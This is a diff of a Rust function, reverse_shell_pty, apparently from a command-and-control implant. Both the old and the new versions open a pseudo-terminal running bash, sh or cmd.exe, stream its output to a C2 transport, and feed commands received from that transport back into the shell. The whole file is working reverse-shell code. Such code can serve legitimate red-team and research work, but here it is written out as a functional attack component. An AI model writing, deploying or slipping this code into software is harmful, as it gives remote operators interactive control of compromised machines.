@@ -1,143 +1,103 @@
 use anyhow::Result;
-use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
-use portable_pty::{native_pty_system, CommandBuilder, PtySize};
-use std::io::{Read, Write};
-use transport::SyncTransport;
 use alloc::string::String;
 use alloc::sync::Arc;
-use alloc::vec::Vec;
-use std::sync::mpsc::{self, Receiver, Sender};
+use transport::SyncTransport;
+use portable_pty::{native_pty_system, CommandBuilder, PtySize};
+use std::io::{Read, Write};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
+use std::sync::mpsc;
 use std::thread;
 
-#[cfg(not(target_os = "windows"))]
-use std::path::Path;
-
 pub fn reverse_shell_pty(transport: Arc<dyn SyncTransport>, task_id: i64, cmd: Option<String>) -> Result<()> {
-    // Channels for transport stream
-    let (transport_tx_req, transport_rx_req) = mpsc::channel();
-    let (transport_tx_resp, transport_rx_resp) = mpsc::channel();
-
-    #[cfg(debug_assertions)]
-    log::info!("starting reverse_shell_pty (task_id={task_id})");
-
-    // Start transport loop in background (SyncTransport::reverse_shell spawns its own task)
-    // We pass the channels to it.
-    transport.reverse_shell(transport_rx_req, transport_tx_resp)?;
-
-    // Send initial registration
-    let _ = transport_tx_req.send(ReverseShellRequest {
-        task_id,
-        kind: ReverseShellMessageKind::Ping.into(),
-        data: Vec::new(),
-    });
-
-    // Use the native pty implementation for the system
+    // 1. Setup PTY
     let pty_system = native_pty_system();
+    let pair = pty_system.openpty(PtySize { rows: 24, cols: 80, pixel_width: 0, pixel_height: 0 })?;
 
-    // Create a new pty
-    let pair = match pty_system.openpty(PtySize {
-        rows: 24,
-        cols: 80,
-        pixel_width: 0,
-        pixel_height: 0,
-    }) {
-        Ok(p) => p,
-        Err(e) => return Err(anyhow::anyhow!(e)),
-    };
-
-    // Spawn command into the pty
     let cmd_builder = match cmd {
         Some(c) => CommandBuilder::new(c),
         None => {
+            #[cfg(target_os = "windows")]
+            { CommandBuilder::new("cmd.exe") }
             #[cfg(not(target_os = "windows"))]
             {
-                if Path::new("/bin/bash").exists() {
+                 if std::path::Path::new("/bin/bash").exists() {
                     CommandBuilder::new("/bin/bash")
                 } else {
                     CommandBuilder::new("/bin/sh")
                 }
             }
-            #[cfg(target_os = "windows")]
-            CommandBuilder::new("cmd.exe")
         }
     };
 
-    let mut child = match pair.slave.spawn_command(cmd_builder) {
-        Ok(c) => c,
-        Err(e) => return Err(anyhow::anyhow!(e)),
-    };
+    let mut child = pair.slave.spawn_command(cmd_builder)?;
+    let mut reader = pair.master.try_clone_reader()?;
+    let mut writer = pair.master.take_writer()?;
 
-    let mut reader = pair.master.try_clone_reader().map_err(|e| anyhow::anyhow!(e))?;
-    let mut writer = pair.master.take_writer().map_err(|e| anyhow::anyhow!(e))?;
+    // 2. Setup Channels
+    // Output: PTY -> C2 (Request)
+    let (out_tx, out_rx) = mpsc::channel();
+    // Input: C2 -> PTY (Response)
+    let (in_tx, in_rx) = mpsc::channel();
 
-    // Spawn thread to read PTY and send to transport
-    let transport_tx_req_clone = transport_tx_req.clone();
-    let pty_reader_thread = thread::spawn(move || {
-        const CHUNK_SIZE: usize = 1024;
-        let mut buffer = [0; CHUNK_SIZE];
+    // 3. Spawn Reader Thread (PTY -> out_tx)
+    let out_tx_clone = out_tx.clone();
+    thread::spawn(move || {
+        // Send Ping first
+        let _ = out_tx_clone.send(ReverseShellRequest {
+            task_id,
+            kind: ReverseShellMessageKind::Ping.into(),
+            data: Vec::new(),
+        });
+
+        let mut buf = [0u8; 1024];
         loop {
-             match reader.read(&mut buffer[..]) {
-                Ok(n) if n > 0 => {
-                    let req = ReverseShellRequest {
-                        kind: ReverseShellMessageKind::Data.into(),
-                        data: buffer[..n].to_vec(),
+             match reader.read(&mut buf) {
+                Ok(0) => break, // EOF
+                Ok(n) => {
+                    let _ = out_tx_clone.send(ReverseShellRequest {
                         task_id,
-                    };
-                    if transport_tx_req_clone.send(req).is_err() {
-                        break;
-                    }
-
-                    // Ping to flush (from original impl)
-                    let ping = ReverseShellRequest {
+                        kind: ReverseShellMessageKind::Data.into(),
+                        data: buf[..n].to_vec(),
+                    });
+                     // Ping to flush (optional, matching previous logic)
+                    let _ = out_tx_clone.send(ReverseShellRequest {
+                        task_id,
                         kind: ReverseShellMessageKind::Ping.into(),
                         data: Vec::new(),
-                        task_id,
-                    };
-                     if transport_tx_req_clone.send(ping).is_err() {
-                        break;
-                    }
+                    });
                 }
-                _ => break,
+                Err(_) => break,
             }
         }
     });
 
-    // Handle Input from transport to PTY
-    loop {
-        // Check if child process is still alive
-        if let Ok(Some(_)) = child.try_wait() {
-             break;
+    // 4. Spawn Transport (Blocking)
+    // We run transport in a separate thread so we can handle input loop here
+    let transport_clone = transport.clone();
+    let transport_thread = thread::spawn(move || {
+        transport_clone.reverse_shell(out_rx, in_tx)
+    });
+
+    // 5. Input Loop (in_rx -> PTY Writer)
+    for msg in in_rx {
+        if msg.kind == ReverseShellMessageKind::Ping as i32 {
+             let _ = out_tx.send(ReverseShellRequest {
+                kind: ReverseShellMessageKind::Ping.into(),
+                data: msg.data,
+                task_id,
+            });
+        } else {
+            let _ = writer.write_all(&msg.data);
         }
 
-        // Blocking receive
-        if let Ok(msg) = transport_rx_resp.recv() {
-             if msg.kind == ReverseShellMessageKind::Ping as i32 {
-                // Echo ping
-                 let req = ReverseShellRequest {
-                    kind: ReverseShellMessageKind::Ping.into(),
-                    data: msg.data,
-                    task_id,
-                };
-                if transport_tx_req.send(req).is_err() {
-                     break;
-                }
-                continue;
-            }
-
-            if writer.write_all(&msg.data).is_err() {
-                break;
-            }
-        } else {
-            // Transport closed
-             let _ = child.kill();
+        // Check if child exited
+        if let Ok(Some(_)) = child.try_wait() {
             break;
         }
     }
 
     let _ = child.kill();
-    let _ = pty_reader_thread.join();
+    let _ = transport_thread.join();
 
-    #[cfg(debug_assertions)]
-    log::info!("stopping reverse_shell_pty (task_id={task_id})");
     Ok(())
 }
